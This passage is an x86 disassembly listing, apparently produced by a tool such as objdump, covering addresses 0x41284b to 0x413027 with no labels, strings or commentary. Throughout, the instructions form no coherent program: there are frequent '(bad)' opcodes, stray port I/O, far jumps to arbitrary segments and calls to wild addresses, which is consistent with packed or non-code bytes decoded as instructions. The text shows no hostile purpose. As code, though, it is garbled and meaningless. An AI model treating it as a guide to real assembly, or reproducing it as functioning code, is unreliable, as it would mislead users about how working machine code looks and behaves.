  41284b:	scas   al,BYTE PTR es:[edi]
  41284c:	(bad)  
  41284d:	cmp    DWORD PTR gs:[edx+0x2a],0xfffffffa
  412852:	dec    edx
  412853:	cs ins DWORD PTR es:[edi],dx
  412855:	imul   esi,DWORD PTR [edi+0x49],0x55
  412859:	call   0x613055f
  41285e:	xor    cl,al
  412860:	test   al,0x69
  412862:	or     DWORD PTR cs:[edx+edi*4-0x44cd0da2],ebp
  41286a:	add    esp,DWORD PTR [edx]
  41286c:	cmp    eax,DWORD PTR gs:[edx+0x3c6e8fdf]
  412873:	daa    
  412874:	xchg   ebx,eax
  412875:	mov    BYTE PTR [ebx],cl
  412877:	popa   
  412878:	ret    
  412879:	sbb    ecx,DWORD PTR [edx]
  41287b:	jns    0x412897
  41287d:	in     eax,dx
  41287e:	adc    eax,0xa3b94570
  412883:	inc    edx
  412884:	neg    al
  412886:	aam    0x14
  412888:	sbb    eax,DWORD PTR ds:0xc2410b5c
  41288e:	pop    esi
  41288f:	mov    esp,0x6844377e
  412894:	scas   al,BYTE PTR es:[edi]
  412895:	jmp    0xb349:0x5ebe5abe
  41289c:	ds sbb al,0xa3
  41289f:	leave  
  4128a0:	cmp    BYTE PTR [ebx],0x12
  4128a3:	jl     0x4128f2
  4128a5:	rcr    ebp,cl
  4128a7:	inc    esi
  4128a8:	bound  esi,QWORD PTR [ebx-0x47]
  4128ab:	jns    0x412896
  4128ad:	daa    
  4128ae:	repnz and ch,BYTE PTR [ecx]
  4128b1:	inc    edi
  4128b2:	and    esi,DWORD PTR [esi]
  4128b4:	sbb    eax,ecx
  4128b6:	pushf  
  4128b7:	in     eax,dx
  4128b8:	pusha  
  4128b9:	add    ebp,edx
  4128bb:	in     eax,dx
  4128bc:	sbb    edx,esp
  4128be:	dec    edi
  4128bf:	dec    ebp
  4128c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c1:	fwait
  4128c2:	sub    DWORD PTR [ebp+0x4d27b39d],esp
  4128c8:	call   0x2d91988f
  4128cd:	les    eax,FWORD PTR [edi-0x70911d53]
  4128d3:	dec    esi
  4128d4:	jnp    0x41291e
  4128d6:	lock push ecx
  4128d8:	call   0x3dbf17d4
  4128dd:	ret    0x1e83
  4128e0:	add    edx,eax
  4128e2:	push   ebp
  4128e3:	fs cmp al,0x73
  4128e6:	mov    ch,0x5a
  4128e8:	popf   
  4128e9:	dec    esp
  4128ea:	mov    ebx,0xfee34a3d
  4128ef:	jle    0x4128e7
  4128f1:	push   esp
  4128f2:	stc    
  4128f3:	in     al,0x48
  4128f5:	mov    eax,0xe49ee2fe
  4128fa:	xchg   DWORD PTR [esi+edi*1],edi
  4128fd:	mov    ecx,0x9b6aae4f
  412902:	cmp    BYTE PTR [esp+ebx*2-0x7d],dl
  412906:	repnz and DWORD PTR [ecx-0x4d9fc08b],ebp
  41290d:	or     bl,BYTE PTR [ecx-0x13]
  412910:	jp     0x41292b
  412912:	out    dx,eax
  412913:	xchg   esi,eax
  412914:	sub    eax,0x1dd1f578
  412919:	iret   
  41291a:	dec    edi
  41291b:	je     0x4128ba
  41291d:	sbb    BYTE PTR ds:0xc64caab5,cl
  412923:	je     0x412985
  412925:	in     eax,0x6f
  412927:	xchg   BYTE PTR [edi],ah
  412929:	scas   eax,DWORD PTR es:[edi]
  41292a:	jbe    0x4128db
  41292c:	aas    
  41292d:	in     eax,dx
  41292e:	jbe    0x412972
  412930:	out    dx,eax
  412931:	js     0x4129a9
  412933:	repnz add edx,DWORD PTR [edi]
  412936:	xlat   BYTE PTR ds:[ebx]
  412937:	aaa    
  412938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412939:	xor    BYTE PTR ds:0x34f2566b,ch
  41293f:	add    DWORD PTR [eax+0x73024686],ebx
  412945:	push   esi
  412946:	lods   al,BYTE PTR ds:[esi]
  412947:	mov    BYTE PTR [ecx+0x1e0a4573],dl
  41294d:	pop    es
  41294e:	ja     0x4128dd
  412950:	jmp    0x6b6dbaa8
  412955:	aas    
  412956:	fst    DWORD PTR [esi-0x60f500ec]
  41295d:	fld    TBYTE PTR [edx]
  41295f:	xchg   DWORD PTR [esi+0x46],edx
  412962:	in     eax,0x5c
  412964:	jle    0x41295b
  412966:	mov    dl,0xfc
  412968:	or     DWORD PTR [edi],edi
  41296a:	or     eax,0x20d322b6
  41296f:	or     eax,0x4c408858
  412974:	fcom   DWORD PTR [ebp+0x26ae4290]
  41297a:	inc    eax
  41297b:	leave  
  41297c:	jmp    0x660c:0x7f639428
  412983:	aaa    
  412984:	sub    eax,DWORD PTR [ebp+0x41430d04]
  41298a:	and    eax,0x6edeaf3d
  41298f:	jno    0x412a05
  412991:	scas   al,BYTE PTR es:[edi]
  412992:	shl    DWORD PTR [eax],cl
  412994:	add    eax,0xa38beff8
  412999:	aad    0x89
  41299b:	ins    DWORD PTR es:[edi],dx
  41299c:	into   
  41299d:	test   eax,0xb6933eac
  4129a2:	mov    edx,0xf7fbb10e
  4129a7:	cmp    BYTE PTR [ebx+0x14b03547],ch
  4129ad:	(bad)  
  4129ae:	imul   esi,DWORD PTR [esi+ebp*8-0x2b],0xffffff94
  4129b3:	push   ds
  4129b4:	repz cmc 
  4129b6:	psubb  mm2,QWORD PTR [esi-0x34]
  4129ba:	add    ah,ah
  4129bc:	dec    ecx
  4129bd:	sub    ch,0xa3
  4129c0:	jl     0x412955
  4129c2:	mov    dl,BYTE PTR [edi]
  4129c4:	and    BYTE PTR [edi],bh
  4129c6:	adc    DWORD PTR [ecx],esp
  4129c8:	sub    al,0x54
  4129ca:	mov    BYTE PTR [ecx-0x116e934d],cl
  4129d0:	lahf   
  4129d1:	fstp   DWORD PTR [ecx-0x17]
  4129d4:	lds    edi,FWORD PTR [ecx-0x697e0265]
  4129da:	add    eax,0x3f77829f
  4129df:	cmp    DWORD PTR [ecx],0x2fcbb608
  4129e5:	test   cl,dl
  4129e7:	and    eax,0x224c7bfc
  4129ec:	rol    esp,1
  4129ee:	in     eax,0x95
  4129f0:	pop    es
  4129f1:	(bad)  
  4129f2:	pop    edx
  4129f3:	scas   al,BYTE PTR es:[edi]
  4129f4:	and    al,dl
  4129f6:	xchg   ebx,eax
  4129f7:	xor    eax,0x2cb88da1
  4129fc:	dec    esp
  4129fd:	push   edi
  4129fe:	mov    edx,0x517b00df
  412a03:	inc    esi
  412a04:	sub    eax,0x5c03cf23
  412a09:	iret   
  412a0a:	cwde   
  412a0b:	jecxz  0x412997
  412a0d:	in     eax,0x67
  412a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a10:	push   0x66
  412a12:	ret    0x839c
  412a15:	icebp  
  412a16:	in     eax,0xd4
  412a18:	jmp    0x412a19
  412a1a:	add    dl,bh
  412a1c:	mov    dh,0x92
  412a1e:	push   esi
  412a1f:	retf   0xe85f
  412a22:	add    BYTE PTR [edi],dl
  412a24:	xor    esi,DWORD PTR [ebx-0xa65b1aa]
  412a2a:	jle    0x412a70
  412a2c:	scas   eax,DWORD PTR es:[edi]
  412a2d:	sbb    ebp,DWORD PTR [ebx+0x34d4f7c1]
  412a33:	push   esi
  412a34:	pop    edx
  412a35:	call   0x18a0e2e8
  412a3a:	retf   0x96a4
  412a3d:	jle    0x412a6f
  412a3f:	add    al,0x3b
  412a41:	mov    BYTE PTR [ebx],bl
  412a43:	and    DWORD PTR [ecx+0x2a],ebp
  412a46:	in     eax,dx
  412a47:	dec    esi
  412a48:	and    eax,0xa3b65d94
  412a4d:	arpl   WORD PTR [edx],dx
  412a4f:	retw   0x89d9
  412a53:	push   ds
  412a54:	push   edi
  412a55:	or     eax,ebp
  412a57:	pusha  
  412a58:	pop    edi
  412a59:	inc    edx
  412a5a:	dec    esp
  412a5b:	jmp    0x412aa4
  412a5d:	pop    ecx
  412a5e:	push   ebp
  412a5f:	mov    ecx,0x821ee793
  412a64:	int3   
  412a65:	add    ebx,DWORD PTR [ecx+0x11b959f2]
  412a6b:	xor    edx,edi
  412a6d:	call   0x5d45:0xf47b2741
  412a74:	out    dx,al
  412a75:	adc    ah,0x1a
  412a78:	add    BYTE PTR [esi],ah
  412a7a:	mov    edi,0xd9595687
  412a7f:	addr16 and al,0x50
  412a82:	jo     0x412acd
  412a84:	push   esp
  412a85:	and    BYTE PTR [edx+0x74],al
  412a88:	aas    
  412a89:	in     al,0x7
  412a8b:	and    ch,BYTE PTR [eax+0x44]
  412a8e:	imul   ecx,DWORD PTR [edx+0x0],0x1f
  412a92:	pop    ebx
  412a93:	mov    al,0x55
  412a95:	adc    ebp,DWORD PTR [esi+0x756befb4]
  412a9b:	pop    ds
  412a9c:	xlat   BYTE PTR ds:[ebx]
  412a9d:	fs out dx,al
  412a9f:	shl    DWORD PTR [esi-0x4f],cl
  412aa2:	dec    esp
  412aa3:	dec    ebx
  412aa4:	stos   BYTE PTR es:[edi],al
  412aa5:	jmp    0x412a95
  412aa7:	loopne 0x412a56
  412aa9:	cmp    al,BYTE PTR [ecx+0x3b]
  412aac:	jg     0x412a71
  412aae:	push   cs
  412aaf:	sub    eax,edi
  412ab1:	add    dh,BYTE PTR [ebx]
  412ab3:	push   esi
  412ab4:	pop    ebp
  412ab5:	in     eax,dx
  412ab6:	fs push es
  412ab8:	pop    esi
  412ab9:	fucomp st(2)
  412abb:	in     eax,dx
  412abc:	shr    BYTE PTR [edx],1
  412abe:	pushf  
  412abf:	xchg   bl,ah
  412ac1:	jmp    0x7c9dd48c
  412ac6:	outs   dx,BYTE PTR ds:[esi]
  412ac7:	push   ebx
  412ac8:	sbb    al,0xd
  412aca:	call   0x27cb:0xe7bbce4
  412ad1:	cli    
  412ad2:	jl     0x412ab5
  412ad4:	call   0x9c3d36ce
  412ad9:	daa    
  412ada:	inc    edx
  412adb:	push   ds
  412adc:	mov    ds:0x824bee36,al
  412ae1:	add    edi,DWORD PTR [edx+0x33]
  412ae4:	iret   
  412ae5:	leave  
  412ae6:	sbb    DWORD PTR [ebx+0x38f4acdb],edi
  412aec:	sahf   
  412aed:	int    0x57
  412aef:	js     0x412afd
  412af1:	mov    eax,0xf9a96be0
  412af6:	sbb    al,0x16
  412af8:	or     BYTE PTR [eax],dl
  412afa:	into   
  412afb:	sub    edx,DWORD PTR [eax+0x4c68816]
  412b01:	rcl    edx,1
  412b03:	push   0x49
  412b05:	sbb    al,0xd0
  412b07:	fisttp QWORD PTR [esi]
  412b09:	daa    
  412b0a:	mov    esp,0x97dfc68c
  412b0f:	bound  eax,QWORD PTR [eax-0x61]
  412b12:	mov    bh,0xed
  412b14:	adc    edx,eax
  412b16:	push   ecx
  412b17:	lods   eax,DWORD PTR ds:[esi]
  412b18:	int3   
  412b19:	pop    ds
  412b1a:	jne    0x412ac6
  412b1c:	push   0x4060cc15
  412b21:	adc    ch,al
  412b23:	ins    BYTE PTR es:[edi],dx
  412b24:	shl    BYTE PTR [edi+0xa],0xa4
  412b28:	sahf   
  412b29:	xchg   BYTE PTR [eax],ah
  412b2b:	mov    eax,ds:0xa7dcf682
  412b30:	push   ecx
  412b31:	iret   
  412b32:	(bad)  
  412b33:	int3   
  412b34:	pusha  
  412b35:	ror    BYTE PTR [esi],cl
  412b37:	iret   
  412b38:	jmp    0x132683e3
  412b3d:	sahf   
  412b3e:	mul    BYTE PTR [ebx+0x61b3f1ea]
  412b44:	fdiv   QWORD PTR [ebx+0x5ff29b1a]
  412b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4b:	test   DWORD PTR [edx+0x61dc5c0d],0x929f9bd7
  412b55:	popa   
  412b56:	push   ebp
  412b57:	push   0xb985993d
  412b5c:	loopne 0x412af8
  412b5e:	jmp    0x412bde
  412b60:	jns    0x412b20
  412b62:	sbb    ecx,DWORD PTR [edx-0x60]
  412b65:	mov    ebx,0xa6b8890f
  412b6a:	or     bh,BYTE PTR [ebx-0x24f46b7]
  412b70:	sbb    eax,0x82ff1199
  412b75:	xchg   ecx,eax
  412b76:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b78:	mov    edi,ebp
  412b7a:	jmp    0x537b:0x4fc0cc69
  412b81:	mov    WORD PTR [ebp+0x2e5ee5e9],?
  412b87:	jge    0x412b28
  412b89:	fs mov ch,0x90
  412b8c:	out    0x3f,eax
  412b8e:	rcr    eax,cl
  412b90:	int    0xb7
  412b92:	dec    edi
  412b93:	das    
  412b94:	add    ah,dh
  412b96:	pop    esp
  412b97:	sub    dl,dl
  412b99:	xchg   esp,eax
  412b9a:	cmp    DWORD PTR [ecx],0x34
  412b9d:	addr16 push ds
  412b9f:	cmp    esp,ebx
  412ba1:	mov    ch,0xdb
  412ba3:	cwde   
  412ba4:	scas   al,BYTE PTR es:[edi]
  412ba5:	push   ebp
  412ba6:	aaa    
  412ba7:	add    al,0x20
  412ba9:	push   ss
  412baa:	xchg   esp,eax
  412bab:	and    al,0x7b
  412bad:	sub    DWORD PTR [esi+0x1c72b99e],0xc5714ab4
  412bb7:	xchg   edi,eax
  412bb8:	pop    edx
  412bb9:	pop    es
  412bba:	retf   0xc4b7
  412bbd:	shl    DWORD PTR [edx+0x4ee22df3],1
  412bc3:	mov    ds:0x3342f590,al
  412bc8:	mov    DWORD PTR [esi+0x78],edi
  412bcb:	or     eax,0x3a5d2de1
  412bd0:	inc    ecx
  412bd1:	mov    ecx,0x3b9383ce
  412bd6:	repz jecxz 0x412c09
  412bd9:	std    
  412bda:	(bad)  
  412bdb:	cmp    eax,0x7cad5887
  412be0:	sub    eax,0x7c2835c2
  412be5:	mov    esp,0x4c47f361
  412bea:	int3   
  412beb:	icebp  
  412bec:	pop    ecx
  412bed:	jecxz  0x412c38
  412bef:	into   
  412bf0:	sahf   
  412bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf2:	sti    
  412bf3:	jmp    0x125b:0xb5c8ee1c
  412bfa:	out    0xc,al
  412bfc:	lock int 0xdc
  412bff:	cbw    
  412c01:	inc    esi
  412c02:	imul   edx,DWORD PTR [eax-0x5b],0x129d1d6b
  412c09:	sub    ebx,DWORD PTR [ecx+esi*2+0x63bb7340]
  412c10:	mov    ah,BYTE PTR [edi-0x14fa75d4]
  412c16:	sbb    eax,0x1cafc31a
  412c1b:	fmul   DWORD PTR [ecx]
  412c1d:	mov    edx,0xee1387d
  412c22:	mov    cl,0xca
  412c24:	adc    DWORD PTR [ebx],esp
  412c26:	mov    dl,0x8e
  412c29:	pcmpgtb mm5,QWORD PTR [eax]
  412c2c:	pop    edx
  412c2d:	clc    
  412c2e:	dec    esi
  412c2f:	iret   
  412c30:	test   eax,0xfb948f0
  412c35:	jns    0x412c5f
  412c37:	push   es
  412c38:	xor    dh,bl
  412c3a:	sahf   
  412c3b:	loopne 0x412bef
  412c3d:	arpl   WORD PTR [edi-0x4e],sp
  412c40:	iret   
  412c41:	and    al,0xf4
  412c43:	aas    
  412c44:	mov    dh,0xd7
  412c46:	xor    dl,BYTE PTR [ebx+0x54]
  412c49:	inc    edi
  412c4a:	pop    ds
  412c4b:	sti    
  412c4c:	inc    ecx
  412c4d:	push   cs
  412c4e:	dec    edx
  412c4f:	pop    edx
  412c50:	test   eax,0x9fa19a7b
  412c55:	mov    edx,0x1c913090
  412c5a:	adc    dl,dl
  412c5c:	mov    ebx,ebx
  412c5e:	xor    edx,DWORD PTR [ecx+ebx*4+0x7c]
  412c62:	les    ecx,FWORD PTR [ebp+0x47b6c254]
  412c68:	and    DWORD PTR [ebx+0xf],ebp
  412c6b:	test   BYTE PTR [esi],bl
  412c6d:	ja     0x412c89
  412c6f:	sbb    BYTE PTR [eax],bh
  412c71:	popf   
  412c72:	mov    cl,0x54
  412c74:	push   cs
  412c75:	mov    bh,BYTE PTR [edx+0x61]
  412c78:	(bad)  
  412c79:	mov    edi,0xd845f192
  412c7e:	jnp    0x412ce4
  412c80:	clc    
  412c81:	jp     0x412cf1
  412c83:	jns    0x412c88
  412c85:	or     eax,0x1619ccaa
  412c8a:	lock stos BYTE PTR es:[edi],al
  412c8c:	push   esp
  412c8d:	jns    0x412cf7
  412c8f:	add    BYTE PTR [ebx],cl
  412c91:	and    eax,0x78663583
  412c96:	out    0x1d,al
  412c98:	or     al,0xdf
  412c9a:	sar    DWORD PTR [ebx],cl
  412c9c:	ret    
  412c9d:	jns    0x412ce5
  412c9f:	fsubr  st,st(7)
  412ca1:	sbb    ch,BYTE PTR [ecx*1+0x3bc68ae5]
  412ca8:	sbb    cl,cl
  412caa:	mov    ebx,0x38f40f21
  412cb0:	mov    dl,0x2a
  412cb2:	mov    bl,0x77
  412cb4:	lock mov al,0x9
  412cb7:	mov    WORD PTR [ecx*4+0x4f03d09c],?
  412cbe:	cwde   
  412cbf:	pop    es
  412cc0:	fld    QWORD PTR [esi]
  412cc2:	jae    0x412c77
  412cc4:	or     bh,BYTE PTR [edi+esi*1+0x19]
  412cc8:	(bad)  
  412cc9:	push   esp
  412cca:	dec    eax
  412ccb:	loope  0x412cfa
  412ccd:	fdivr  QWORD PTR [ecx+0x74]
  412cd0:	es iret 
  412cd2:	add    edi,DWORD PTR [ebx]
  412cd4:	pop    ss
  412cd5:	mov    esp,cs
  412cd7:	fstp   DWORD PTR [edx-0x3797b96a]
  412cdd:	mov    eax,ds:0xb7db87a6
  412ce2:	sbb    ecx,ebp
  412ce4:	popaw  
  412ce6:	test   eax,0x7ae1d6b7
  412ceb:	js     0x412d04
  412ced:	test   al,0x7f
  412cef:	adc    bh,BYTE PTR [ebp-0x1d894382]
  412cf5:	fadd   DWORD PTR [edi+0x6c]
  412cf8:	inc    eax
  412cf9:	stos   BYTE PTR es:[edi],al
  412cfa:	mov    DWORD PTR [ecx],ebp
  412cfc:	push   ebx
  412cfd:	(bad)  [esi]
  412cff:	pop    es
  412d00:	xchg   ecx,eax
  412d01:	push   esi
  412d02:	inc    eax
  412d03:	into   
  412d04:	mov    esp,0x5ccfebe1
  412d09:	in     al,dx
  412d0a:	push   ebp
  412d0b:	loopne 0x412ce7
  412d0d:	lds    ebx,FWORD PTR [esi-0x2a753405]
  412d13:	cmp    ebp,edi
  412d15:	stc    
  412d16:	call   0x5a04:0x4c7cef44
  412d1d:	mov    DWORD PTR [esi],ecx
  412d1f:	pusha  
  412d20:	xchg   ecx,eax
  412d21:	pop    edi
  412d22:	mov    edi,0x9b8349ab
  412d27:	mov    ch,0xfe
  412d29:	pop    esp
  412d2a:	pop    es
  412d2b:	es es add eax,0x98828b38
  412d32:	test   BYTE PTR [eax],ch
  412d34:	push   ebp
  412d35:	mov    ds:0xc176b1b3,al
  412d3a:	les    eax,FWORD PTR [eax+0x2b]
  412d3d:	imul   ebp,DWORD PTR [edi-0x23],0x60
  412d41:	push   cs
  412d42:	iret   
  412d43:	imul   eax,DWORD PTR ds:0xd0cf60d5,0x996c8bd0
  412d4d:	adc    BYTE PTR [eax-0x21],bl
  412d50:	pop    eax
  412d51:	fbstp  TBYTE PTR [ebx+0x0]
  412d54:	xchg   ebp,eax
  412d55:	mov    ah,BYTE PTR ds:0x75a4ef81
  412d5b:	(bad)  
  412d5c:	jmp    0x412d82
  412d5e:	sbb    eax,0xff405692
  412d63:	repz dec esi
  412d65:	scas   eax,DWORD PTR es:[edi]
  412d66:	sbb    DWORD PTR [edi],ebp
  412d68:	xchg   ebx,eax
  412d69:	fdiv   DWORD PTR [ecx+0x1e3969b5]
  412d6f:	cwde   
  412d70:	sbb    ebp,DWORD PTR [edi+0x14]
  412d73:	out    0x6f,al
  412d75:	or     esp,DWORD PTR [ebx]
  412d77:	mov    dl,0x50
  412d79:	fwait
  412d7a:	stos   BYTE PTR es:[edi],al
  412d7b:	xchg   esp,eax
  412d7c:	sbb    edi,DWORD PTR [ecx-0x73]
  412d7f:	ficomp DWORD PTR [esi-0x45b94eba]
  412d85:	mov    esp,0x9e42267f
  412d8a:	ffree  st(5)
  412d8c:	add    DWORD PTR [ebx],ebp
  412d8e:	dec    esi
  412d8f:	jle    0x412db6
  412d91:	push   0x4c
  412d93:	repz pop ebx
  412d95:	cmp    bl,BYTE PTR [ebp+edx*4+0x1af22479]
  412d9c:	mov    gs,WORD PTR [edx+0x40]
  412d9f:	xchg   ebx,eax
  412da0:	fld    DWORD PTR [edx-0x5a]
  412da3:	ret    0x9bfd
  412da6:	clc    
  412da7:	pop    es
  412da8:	mov    esi,0xc6be74e2
  412dad:	xchg   ebx,eax
  412dae:	sbb    bh,BYTE PTR [edi]
  412db0:	iret   
  412db1:	inc    edx
  412db2:	sbb    BYTE PTR [esi+edx*2+0x7b2c2922],ch
  412db9:	aad    0x65
  412dbb:	pushf  
  412dbc:	mov    ah,0xba
  412dbe:	cmp    BYTE PTR [edi-0x19bc05a4],ch
  412dc4:	out    0xe8,eax
  412dc6:	sti    
  412dc7:	sbb    eax,edi
  412dc9:	jnp    0x412d95
  412dcb:	pop    ebx
  412dcc:	pop    es
  412dcd:	cmp    DWORD PTR [esi+eiz*4],esi
  412dd0:	data16 jl 0x412dc3
  412dd3:	jge    0x412d69
  412dd5:	rcl    DWORD PTR [eax+eiz*2],0x7b
  412dd9:	dec    esp
  412dda:	mov    bh,0x7
  412ddc:	pop    ds
  412ddd:	adc    BYTE PTR [edx+0x2e],0x89
  412de1:	cmp    eax,0x91476ddc
  412de6:	xor    ah,BYTE PTR [esi]
  412de8:	sahf   
  412de9:	stos   BYTE PTR es:[edi],al
  412dea:	repz mov dl,0xe9
  412ded:	cs std 
  412def:	mov    edx,DWORD PTR [esi-0xfe74e3c]
  412df5:	in     al,dx
  412df6:	stos   BYTE PTR es:[edi],al
  412df7:	xor    BYTE PTR [ebp-0x37ea76f5],bh
  412dfd:	mov    ebx,0xa6b1860e
  412e02:	(bad)  
  412e03:	jmp    0x412e37
  412e05:	jb     0x412dda
  412e07:	xchg   BYTE PTR [ecx-0x79],al
  412e0a:	mov    ds:0x3c13a5e,eax
  412e0f:	add    cl,BYTE PTR [ebx-0x2a]
  412e12:	or     edx,DWORD PTR [eax+ebp*8]
  412e15:	std    
  412e16:	inc    ecx
  412e17:	ret    0xd783
  412e1a:	jo     0xbcf5607a
  412e20:	pop    es
  412e21:	adc    ch,0xf
  412e24:	clc    
  412e25:	test   al,0x43
  412e27:	stos   BYTE PTR es:[edi],al
  412e28:	push   0xc5b7f7a1
  412e2d:	xchg   edx,eax
  412e2e:	test   BYTE PTR [ebx-0x44870b27],ch
  412e34:	lods   al,BYTE PTR ds:[esi]
  412e35:	test   BYTE PTR [ebp+0x0],dh
  412e38:	jmp    0x412e69
  412e3a:	xchg   DWORD PTR [esi],edi
  412e3c:	rcl    DWORD PTR [ebp+0x1c489a32],1
  412e42:	cwde   
  412e43:	add    al,0x63
  412e45:	pusha  
  412e46:	sbb    esp,DWORD PTR [ebx+0x6599e9a3]
  412e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e4d:	jge    0x412e5f
  412e4f:	jmp    DWORD PTR [ecx-0x2786d95b]
  412e55:	std    
  412e56:	mov    ds:0xf30bd891,eax
  412e5b:	push   ecx
  412e5c:	sub    DWORD PTR [edx],esi
  412e5e:	neg    bh
  412e60:	rol    BYTE PTR [esi-0x6cd17661],0x63
  412e67:	cli    
  412e68:	adc    DWORD PTR [ecx+0x6f],esp
  412e6b:	jmp    DWORD PTR [eax-0x71d74bff]
  412e71:	sbb    al,0xb
  412e73:	fisubr DWORD PTR [esi]
  412e75:	shl    bl,cl
  412e77:	sub    al,0x2e
  412e79:	aam    0x7b
  412e7b:	mov    ebx,0x25621abb
  412e80:	cmp    edi,DWORD PTR [edi]
  412e82:	shr    DWORD PTR [eax-0x25],1
  412e85:	lods   al,BYTE PTR ds:[esi]
  412e86:	or     DWORD PTR [eax],ebp
  412e88:	sub    al,0xe8
  412e8a:	(bad)  
  412e8b:	neg    DWORD PTR [ebx-0x70]
  412e8e:	jg     0x412eab
  412e90:	pop    ecx
  412e91:	dec    esi
  412e92:	mov    dl,al
  412e94:	add    DWORD PTR [esi+0xd],eax
  412e97:	arpl   WORD PTR [eax],bx
  412e99:	retf   0x933b
  412e9c:	dec    esi
  412e9d:	inc    eax
  412e9e:	daa    
  412e9f:	push   0x27
  412ea1:	or     bl,ch
  412ea3:	dec    ebp
  412ea4:	xchg   ebx,eax
  412ea5:	repz dec ebp
  412ea7:	add    dh,cl
  412ea9:	sub    eax,0x2515d2ba
  412eae:	retf   
  412eaf:	xor    al,0xb1
  412eb1:	std    
  412eb2:	jmp    0xd594dcdd
  412eb7:	dec    edi
  412eb8:	adc    al,0xd
  412eba:	(bad)  
  412ebb:	fsubr  DWORD PTR [eax]
  412ebd:	cli    
  412ebe:	mov    al,ds:0xa96efba6
  412ec3:	and    ch,bl
  412ec5:	jo     0x412f05
  412ec7:	(bad)  
  412ec9:	mov    eax,ebx
  412ecb:	rol    cl,cl
  412ecd:	add    dh,ah
  412ecf:	jecxz  0x412e8b
  412ed1:	popa   
  412ed2:	xlat   BYTE PTR ds:[ebx]
  412ed3:	mov    dh,0xbe
  412ed5:	fs push 0xe976e5d4
  412edb:	xchg   ecx,eax
  412edc:	xchg   edx,eax
  412edd:	adc    eax,0x3b4124b
  412ee2:	pop    edx
  412ee3:	cld    
  412ee4:	pop    esi
  412ee5:	mov    cl,0x4b
  412ee7:	pushf  
  412ee8:	jbe    0x412e78
  412eea:	mov    ebx,0xfc050bd8
  412eef:	aam    0xbe
  412ef1:	mov    bl,0x83
  412ef3:	popf   
  412ef4:	ss sbb al,0xc
  412ef7:	sub    ebx,DWORD PTR [edi+ebx*8-0x1ebcaefe]
  412efe:	in     al,0x31
  412f00:	mov    ecx,0x9bf98c53
  412f05:	xchg   esp,eax
  412f06:	cld    
  412f07:	jecxz  0x412f5e
  412f09:	xor    al,0x27
  412f0b:	outs   dx,BYTE PTR ds:[esi]
  412f0c:	dec    eax
  412f0d:	push   ds
  412f0e:	repz ficom WORD PTR [edi]
  412f11:	sbb    BYTE PTR [ebx+ecx*4],ah
  412f14:	sub    al,0x6a
  412f16:	xchg   ecx,eax
  412f17:	add    eax,0x6133471d
  412f1c:	jno    0x412ece
  412f1e:	sbb    eax,0xaa9dfecc
  412f23:	or     al,BYTE PTR [edi]
  412f25:	or     BYTE PTR [ecx-0xc],0x42
  412f29:	mov    ds:0x4ab0ee1f,al
  412f2e:	add    esp,DWORD PTR [edi+0x59]
  412f31:	mov    bl,0x77
  412f33:	das    
  412f34:	inc    eax
  412f35:	or     DWORD PTR [eax+0x3dacbbd],esp
  412f3b:	daa    
  412f3c:	or     al,0x47
  412f3e:	sti    
  412f3f:	or     DWORD PTR [eax+edx*2-0x71119387],ebx
  412f46:	jp     0x412edb
  412f48:	pop    esp
  412f49:	add    eax,0x7849ae33
  412f4e:	jge    0x412f7c
  412f50:	mov    ch,0xaa
  412f52:	mov    DWORD PTR [ebp-0x1d663127],edx
  412f58:	inc    BYTE PTR [eax+0x5f43fd3d]
  412f5e:	xor    eax,0xfce33927
  412f63:	push   eax
  412f64:	ror    BYTE PTR ds:0x61f26baf,0xfe
  412f6b:	mov    esp,0xee95625b
  412f70:	test   ecx,0xd784a093
  412f76:	lock and ah,al
  412f79:	jle    0x412f06
  412f7b:	adc    BYTE PTR [esi+eiz*2],0x65
  412f7f:	cmp    ecx,DWORD PTR [ebx+0x5227c4ac]
  412f85:	cld    
  412f86:	retf   
  412f87:	sub    ecx,esp
  412f89:	mov    bh,0xfc
  412f8b:	lock pop es
  412f8d:	mov    bl,0xc8
  412f8f:	hlt    
  412f90:	add    ecx,edx
  412f92:	ficom  DWORD PTR [ecx+eax*8]
  412f95:	fild   WORD PTR es:0xb2165a68
  412f9c:	or     al,0xa
  412f9e:	test   al,0x29
  412fa0:	xchg   esp,eax
  412fa1:	xchg   edi,edx
  412fa3:	div    DWORD PTR [edi-0x7ec5291e]
  412fa9:	loopne 0x412f3b
  412fab:	rcl    edx,0x74
  412fae:	pop    ebp
  412faf:	arpl   WORD PTR [ebx-0x1a4b6dbb],cx
  412fb5:	ds fcomip st,st(3)
  412fb8:	mov    bh,0x64
  412fba:	sbb    al,bl
  412fbc:	xchg   esp,eax
  412fbd:	ror    BYTE PTR [ebx+0x41],1
  412fc0:	jmp    DWORD PTR [ebx]
  412fc2:	(bad)  
  412fc3:	fidiv  DWORD PTR ds:0x8a1e83aa
  412fc9:	or     edx,DWORD PTR [edx]
  412fcb:	es push ds
  412fcd:	and    BYTE PTR [edi+0x67],cl
  412fd0:	push   esp
  412fd1:	sbb    ah,BYTE PTR [ebx+0x58]
  412fd4:	xchg   esp,eax
  412fd5:	add    DWORD PTR [edx],eax
  412fd7:	cmp    BYTE PTR [edx+eax*1-0x2e4f781],bl
  412fde:	das    
  412fdf:	xchg   edx,eax
  412fe0:	rcr    DWORD PTR [ecx+0xb77813e],1
  412fe6:	inc    edi
  412fe7:	cmp    al,0x47
  412fe9:	cmc    
  412fea:	outs   dx,BYTE PTR ds:[esi]
  412feb:	fisub  WORD PTR [edi+0x43]
  412fee:	icebp  
  412fef:	outs   dx,BYTE PTR ds:[esi]
  412ff0:	mov    esi,0xc747994f
  412ff5:	sbb    BYTE PTR [esi+0x27470b02],bh
  412ffb:	test   esi,ecx
  412ffd:	ss ds inc edx
  413000:	or     eax,0xd0e04094
  413005:	jb     0x41301e
  413007:	in     al,0x86
  413009:	daa    
  41300a:	cmp    bl,BYTE PTR [ecx-0x1b]
  41300d:	mov    ebp,eax
  41300f:	jge    0x412fec
  413011:	mov    ebx,DWORD PTR [edx-0x6e6fff84]
  413017:	js     0x413083
  413019:	adc    al,0xad
  41301b:	enter  0xbc30,0x62
  41301f:	and    BYTE PTR [ecx-0x75bb11b4],0x1a
  413026:	iret   
  413027:	mov    bh,BYTE PTR [ecx-0x5c]
